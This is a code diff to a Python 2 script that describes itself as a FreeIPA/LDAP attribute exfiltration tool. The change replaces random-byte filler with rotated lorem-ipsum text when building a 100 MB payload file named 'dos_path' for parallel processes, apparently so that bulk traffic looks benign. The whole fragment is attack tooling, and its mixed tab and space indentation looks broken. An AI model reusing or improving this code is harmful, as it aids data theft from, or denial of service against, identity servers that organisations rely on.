@@ -9,8 +9,20 @@ import base64
 import getpass
 from multiprocessing import Process
 import tempfile
+import collections
 
 proc_number = 10
+
+seed = "1092384956781341341234656953214543219"
+words = open("ipsum.txt", "r").read().replace("\n", '').split()
+
+def fdata():
+    a = collections.deque(words)
+    b = collections.deque(seed)
+    while True:
+        yield ' '.join(list(a)[0:1024])
+        a.rotate(int(b[0]))
+        b.rotate(1)
 
 def main():
     parser = argparse.ArgumentParser(description='FreeIPA / LDAP attribute exfiltration script')
@@ -42,7 +54,10 @@ def main():
 	fsize = 1024*1024*100
 	try:
 		with open(dos_path, "w") as tmp:
-			tmp.write(base64.encodestring(os.urandom(fsize)).replace('\n', ''))
+                        g = fdata()
+                        while os.path.getsize(dos_path) < fsize:
+                        	tmp.write(base64.encodestring(g.next()))
+
         except IOError as e:
     		print 'IOError'
     	procs = []
